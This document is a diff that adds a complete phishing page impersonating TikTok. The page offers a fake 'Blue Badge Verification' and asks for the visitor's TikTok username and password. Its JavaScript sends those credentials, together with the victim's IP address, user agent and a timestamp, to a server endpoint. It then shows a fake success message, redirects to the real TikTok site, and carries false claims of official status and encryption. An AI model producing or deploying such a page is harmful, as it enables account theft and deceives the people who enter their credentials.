@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blue Badge Verification - TikTok</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        body {
+            background: #000000;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(255, 0, 80, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 242, 234, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 40%, rgba(0, 119, 255, 0.05) 0%, transparent 50%);
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 420px;
+            width: 100%;
+            margin: 0 auto;
+            z-index: 1;
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-top: 10px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 2.5rem;
+            margin-right: 10px;
+            background: linear-gradient(45deg, #FF0050, #00F2EA);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .logo-text {
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(45deg, #FFFFFF, #E0E0E0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+        
+        .header h2 {
+            font-size: 1.3rem;
+            font-weight: 500;
+            color: #A0A0A0;
+            margin-top: 5px;
+        }
+        
+        .verification-card {
+            background: rgba(22, 24, 28, 0.95);
+            border-radius: 16px;
+            padding: 28px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+        
+        .badge-header {
+            text-align: center;
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .badge-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00F2EA, #0077FF);
+            margin-bottom: 16px;
+            box-shadow: 0 0 20px rgba(0, 119, 255, 0.5);
+            position: relative;
+        }
+        
+        .badge-icon::after {
+            content: '✓';
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: white;
+        }
+        
+        .promo-title {
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            background: linear-gradient(45deg, #FFFFFF, #E0E0E0);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            font-size: 1.05rem;
+            color: #A0A0A0;
+            line-height: 1.4;
+        }
+        
+        .benefits-list {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 14px;
+            color: #E0E0E0;
+            font-size: 0.95rem;
+        }
+        
+        .benefit-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .benefit-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #00F2EA, #0077FF);
+            margin-right: 12px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+        
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        
+        .input-label {
+            font-size: 0.95rem;
+            color: #C0C0C0;
+            font-weight: 500;
+        }
+        
+        .input-field {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 14px 16px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #00F2EA;
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .input-field::placeholder {
+            color: #888;
+        }
+        
+        .verify-button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(45deg, #FE2C55, #00F2EA);
+            border: none;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 1.05rem;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-top: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .verify-button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4);
+        }
+        
+        .verify-button:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #666;
+            font-size: 0.85rem;
+            padding: 0 10px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #00F2EA;
+            font-size: 0.95rem;
+        }
+
+        .error {
+            display: none;
+            text-align: center;
+            margin: 15px 0;
+            color: #FF375F;
+            background: rgba(255, 55, 95, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 55, 95, 0.3);
+            font-size: 0.9rem;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            background: rgba(0, 255, 136, 0.1);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            margin-top: 20px;
+        }
+        
+        .success-icon {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #00FF88;
+        }
+        
+        .countdown {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #00FF88;
+            margin: 12px 0;
+            background: rgba(0, 255, 136, 0.1);
+            padding: 8px 16px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        
+        .security-notice {
+            text-align: center;
+            font-size: 0.8rem;
+            color: #888;
+            margin-top: 20px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .lock-icon {
+            color: #00F2EA;
+            font-size: 1rem;
+        }
+        
+        .tiktok-pattern {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            z-index: -1;
+            opacity: 0.03;
+        }
+        
+        .tiktok-pattern::before {
+            content: '♪';
+            position: absolute;
+            font-size: 10rem;
+            top: 10%;
+            left: 10%;
+            transform: rotate(-15deg);
+            color: #FE2C55;
+        }
+        
+        .tiktok-pattern::after {
+            content: '♫';
+            position: absolute;
+            font-size: 8rem;
+            bottom: 15%;
+            right: 10%;
+            transform: rotate(15deg);
+            color: #00F2EA;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 0 10px;
+            }
+            
+            .verification-card {
+                padding: 24px 20px;
+            }
+            
+            .logo-text {
+                font-size: 2rem;
+            }
+            
+            .badge-icon {
+                width: 70px;
+                height: 70px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="tiktok-pattern"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <div class="logo-icon"><i class="fa-brands fa-tiktok"></i></div>
+                <div class="logo-text">TikTok</div>
+        </div>
+            <h2>Official Verification Program</h2>
+        </div>
+        
+        <div class="verification-card">
+            <div class="badge-header">
+                <div class="badge-icon"></div>
+                <div class="promo-title">Blue Badge Verification</div>
+                <div class="subtitle">Verify your account to get the official blue badge</div>
+            </div>
+            
+            <div class="benefits-list">
+                <div class="benefit-item">
+                    <span class="benefit-icon">✓</span>
+                    <span>Increased credibility and authenticity</span>
+                </div>
+                <div class="benefit-item">
+                    <span class="benefit-icon">✓</span>
+                    <span>Priority in search and recommendations</span>
+                </div>
+                <div class="benefit-item">
+                    <span class="benefit-icon">✓</span>
+                    <span>Enhanced visibility and reach</span>
+                </div>
+                <div class="benefit-item">
+                    <span class="benefit-icon">✓</span>
+                    <span>Access to exclusive features</span>
+                </div>
+            </div>
+            
+            <form id="verificationForm" class="login-form">
+                <div class="input-group">
+                    <label class="input-label">Username, email, or phone</label>
+                    <input type="text" id="username" class="input-field" placeholder="Enter your TikTok username" required>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Password</label>
+                    <input type="password" id="password" class="input-field" placeholder="Enter your password" required>
+                </div>
+
+                <div class="loading" id="loading">
+                    <p>🔒 Verifying your account credentials...</p>
+                </div>
+
+                <div class="error" id="error">
+                    <p>⚠️ Verification failed. Please check your credentials and try again.</p>
+                </div>
+                
+                <button type="submit" class="verify-button pulse" id="verifyButton">
+                    Verify Account
+                </button>
+                
+                <div class="success-message" id="successMessage">
+                    <div class="success-icon">✓</div>
+                    <h3>Verification Submitted Successfully!</h3>
+                    <p>Your TikTok account has been submitted for Blue Badge verification.</p>
+                    <div class="countdown" id="countdown">Badge will activate within 2-3 business days</div>
+                    <p>You will receive a notification in the app once your verification is complete.</p>
+                </div>
+            </form>
+            
+            <div class="security-notice">
+                <span class="lock-icon">🔒</span>
+                Your information is secure. We use encryption to protect your data.
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>© 2023 TikTok. All rights reserved. | Official Verification Program</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const verifyButton = document.getElementById('verifyButton');
+            const loading = document.getElementById('loading');
+            const error = document.getElementById('error');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Reset states
+            error.style.display = 'none';
+            successMessage.style.display = 'none';
+            loading.style.display = 'block';
+            verifyButton.disabled = true;
+            verifyButton.textContent = 'Verifying...';
+            verifyButton.classList.remove('pulse');
+            
+            try {
+                // Get IP address
+                const ip = await getIPAddress();
+                
+                // Send credentials to Node.js server
+                const response = await fetch('/verify-account', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        ip: ip,
+                        userAgent: navigator.userAgent,
+                        timestamp: new Date().toISOString(),
+                        verificationType: 'blue-badge'
+                    })
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    // Show success message after delay
+                    setTimeout(() => {
+                        loading.style.display = 'none';
+                        successMessage.style.display = 'block';
+                        verifyButton.style.display = 'none';
+                        
+                        // Start countdown animation
+                        startCountdown();
+                        
+                        // Redirect to TikTok after longer delay
+                        setTimeout(() => {
+                            window.location.href = 'https://tiktok.com';
+                        }, 8000);
+                    }, 3000);
+                } else {
+                    throw new Error(result.message || 'Verification failed');
+                }
+                
+            } catch (error) {
+                console.error('Error:', error);
+                loading.style.display = 'none';
+                error.style.display = 'block';
+                verifyButton.disabled = false;
+                verifyButton.textContent = 'Verify Account';
+                verifyButton.classList.add('pulse');
+                
+                // Auto-hide error after 5 seconds
+                setTimeout(() => {
+                    error.style.display = 'none';
+                }, 5000);
+            }
+        });
+
+        function startCountdown() {
+            const countdownElement = document.getElementById('countdown');
+            let seconds = 8;
+            
+            const countdownInterval = setInterval(() => {
+                seconds--;
+                if (seconds <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = 'Redirecting to TikTok...';
+                } else if (seconds <= 3) {
+                    countdownElement.textContent = `Redirecting in ${seconds}...`;
+                }
+            }, 1000);
+        }
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return 'Unknown';
+            }
+        }
+
+        // Add some interactive effects
+        document.querySelectorAll('.input-field').forEach(field => {
+            field.addEventListener('focus', function() {
+                this.style.borderColor = '#00F2EA';
+                this.parentElement.style.transform = 'translateY(-2px)';
+            });
+            
+            field.addEventListener('blur', function() {
+                this.style.borderColor = 'rgba(255, 255, 255, 0.1)';
+                this.parentElement.style.transform = 'translateY(0)';
+            });
+        });
+    </script>
+</body>
+  </html>
